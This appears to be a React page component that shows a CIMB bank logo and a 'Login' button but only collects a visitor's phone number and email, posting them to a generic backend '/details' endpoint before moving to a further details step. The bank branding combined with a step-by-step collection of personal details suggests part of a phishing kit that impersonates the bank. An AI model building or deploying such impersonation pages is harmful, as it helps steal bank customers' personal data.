import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png"; // Adjust the path to your logo
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  phoneNumber: yup.string().required("Phone Number is required"),
  email: yup.string().required("Email is required"),
});

const UserDetails = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword(!showPassword);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/details`, data)
      .then((response) => {
        reset();
        navigate("/details");
      })
      .catch((error) => {
        console.error("Login error", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-[7em] px-4">
      <div className="w-full max-w-sm bg-white px-2 ">
        {/* Logo */}
        <div className="flex justify-center mb-12">
          <img src={logo} alt="CIMB Logo" className="w-[70%] min-h-[30px]" />
        </div>

        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          {/* Username Field */}
          <div className="mb-[6em] space-y-5">
            <div>
              <input
                type="text"
                placeholder="Phone Number"
                {...register("phoneNumber")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-full focus:outline-none placeholder:text-gray-500"
              />
              <FormErrMsg errors={errors} inputName="phoneNumber" />
            </div>
            {/* email field */}
            <div>
              <input
                type="text"
                placeholder="Email"
                {...register("email")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-full focus:outline-none placeholder:text-gray-500"
              />
              <FormErrMsg errors={errors} inputName="email" />
            </div>
          </div>
          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-full font-semibold text-white ${
              loading
                ? "bg-red-300 cursor-not-allowed"
                : "bg-red-600 hover:bg-red-700"
            }`}
          >
            {loading ? "Logging in..." : "Login"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default UserDetails;
